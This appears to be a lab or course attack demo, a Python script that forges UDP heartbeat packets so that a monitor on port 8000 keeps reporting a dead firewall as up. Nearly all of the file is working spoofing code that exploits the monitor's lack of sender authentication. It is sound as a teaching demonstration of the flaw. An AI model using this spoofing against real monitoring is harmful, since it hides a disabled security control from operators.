"""
heartbeat_spoofer.py  --  Attack demo for MP1.1 Fault Detection

Demonstrates that the Vulcan Monitor trusts ANY UDP packet containing the
bytes b"HEARTBEAT" on port 8000, from ANY source. It never authenticates the
sender, so an attacker can forge the firewall's liveness signal.

Scenario:
    1. Start monitor.py           (watches for heartbeats)
    2. Start firewall.py          (real heartbeats begin)
    3. Kill firewall.py           (the real heartbeat stops)
    4. Run this spoofer           (monitor keeps thinking the firewall is UP)

The firewall can be dead and silently NOT inspecting traffic, while the
monitor's dashboard still reports a healthy, protected network.
"""
import socket
import time

MONITOR_IP = "127.0.0.1"
MONITOR_PORT = 8000
# Match the real firewall's cadence so the forgery is indistinguishable.
HEARTBEAT_INTERVAL = 3.0

def spoof():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[SPOOFER] Forging heartbeats to {MONITOR_IP}:{MONITOR_PORT} "
          f"every {HEARTBEAT_INTERVAL}s. The firewall does not need to be running.")
    try:
        while True:
            sock.sendto(b"HEARTBEAT", (MONITOR_IP, MONITOR_PORT))
            print("[SPOOFER] sent forged HEARTBEAT 💉")
            time.sleep(HEARTBEAT_INTERVAL)
    except KeyboardInterrupt:
        print("\n[SPOOFER] Stopped.")
    finally:
        sock.close()

if __name__ == "__main__":
    spoof()
